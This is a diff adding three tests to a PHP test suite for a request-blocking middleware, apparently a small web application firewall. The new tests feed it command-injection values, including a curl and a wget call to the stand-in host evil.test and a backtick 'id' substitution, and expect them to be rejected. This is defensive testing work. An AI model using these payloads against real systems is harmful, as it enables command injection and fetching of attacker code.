@@ -32,6 +32,24 @@ test('blocks a path traversal attempt in the URI', function () {
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
 
+test('blocks a command substitution payload in the request body', function () {
+    $request = Request::create('/login', 'POST', ['note' => 'ok; $(curl http://evil.test/x)']);
+
+    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
+})->throws(HttpException::class);
+
+test('blocks a backtick command substitution payload in the request body', function () {
+    $request = Request::create('/login', 'POST', ['note' => 'ok `id`']);
+
+    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
+})->throws(HttpException::class);
+
+test('blocks a bare wget/curl download payload in the request body', function () {
+    $request = Request::create('/login', 'POST', ['note' => 'wget http://evil.test/shell.sh']);
+
+    (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
+})->throws(HttpException::class);
+
 test('skips the check for excluded paths', function () {
     config(['waf.exclude_paths' => ['telescope*']]);
 
